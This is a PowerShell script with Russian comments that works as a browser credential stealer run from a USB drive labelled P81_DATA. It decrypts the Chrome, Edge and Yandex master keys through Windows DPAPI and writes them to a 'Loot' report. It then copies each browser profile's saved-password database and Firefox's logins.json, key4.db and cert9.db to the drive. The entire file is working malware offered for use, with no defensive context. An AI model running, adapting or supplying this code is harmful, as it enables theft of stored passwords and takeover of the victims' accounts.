# 1. Поиск флешки по метке P81_DATA
$u = (Get-Volume -FileSystemLabel "P81_DATA").DriveLetter
if (!$u) { exit }
$u = "$($u):"

# 2. Создание папки назначения
$dest = "$u\Loot_$(Get-Date -f HHmm)"
cmd /c "mkdir $dest 2>nul"
$report = "$dest\REPORT.txt"

# Подгружаем сборку для работы с DPAPI
Add-Type -AssemblyName System.Security

# Функция для дешифровки ключа Chromium
function Get-Key($statePath, $label, $destDir) {
    if (Test-Path $statePath) {
        try {
            $json = Get-Content $statePath -Raw | ConvertFrom-Json
            $rawBytes = [Convert]::FromBase64String($json.os_crypt.encrypted_key)
            $encKey = $rawBytes[5..($rawBytes.Length-1)]
            
            # Дешифровка мастер-ключа через системный DPAPI
            $masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encKey, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
            $base64Key = [Convert]::ToBase64String($masterKey)
            
            "[$label] Master Key: $base64Key" >> "$destDir\REPORT.txt"
            return $true
        } catch { 
            "[$label] Key Error: $($_.Exception.Message)" >> "$destDir\REPORT.txt"
            return $false 
        }
    }
    return $false
}

# 3. СБОР CHROMIUM (Chrome, Edge, Yandex)
$browsers = @(
    @{name="Chrome"; path="Google\Chrome\User Data"},
    @{name="Edge"; path="Microsoft\Edge\User Data"},
    @{name="Yandex"; path="Yandex\YandexBrowser\User Data"}
)

foreach ($b in $browsers) {
    $userDataPath = Join-Path $env:LOCALAPPDATA $b.path
    if (Test-Path $userDataPath) {
        # Ищем Local State для получения ключа
        $localState = Join-Path $userDataPath "Local State"
        
        # Ищем все файлы Login Data (базы) во всех профилях
        $foundFiles = Get-ChildItem -Path $userDataPath -Recurse -Filter "Login Data" -ErrorAction SilentlyContinue
        
        foreach ($file in $foundFiles) {
            # Определяем имя профиля (напр. Default или Profile 1)
            $profileName = $file.Directory.Name
            $label = "$($b.name)_$($profileName)"
            
            # Сначала пытаемся получить ключ
            if (Get-Key $localState $label $dest) {
                # Копируем базу. Используем cmd /c xcopy для максимальной стабильности
                # Флаг /Y — подавление запроса на подтверждение перезаписи
                # Флаг /H — копирование скрытых и системных файлов
                # Флаг /C — продолжение копирования даже при возникновении ошибок
                $targetFile = "$dest\$($label)_db"
                cmd /c "xcopy /Y /H /C `"$($file.FullName)`" `"$dest\`"" 
                
                # Переименовываем скопированный файл для идентификации
                if (Test-Path "$dest\Login Data") {
                    Rename-Item -Path "$dest\Login Data" -NewName "$($label)_db" -Force
                }
            }
        }
    }
}

# 4. СБОР FIREFOX
$ffPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
if (Test-Path $ffPath) {
    cmd /c "mkdir $dest\FF 2>nul"
    Get-ChildItem -Path $ffPath -Directory | ForEach-Object {
        $label = $_.Name
        $files = @("logins.json", "key4.db", "cert9.db")
        foreach ($f in $files) {
            $src = Join-Path $_.FullName $f
            if (Test-Path $src) {
                cmd /c "copy /Y `"$src`" `"$dest\FF\$($label)_$f`""
            }
        }
    }
}

exit
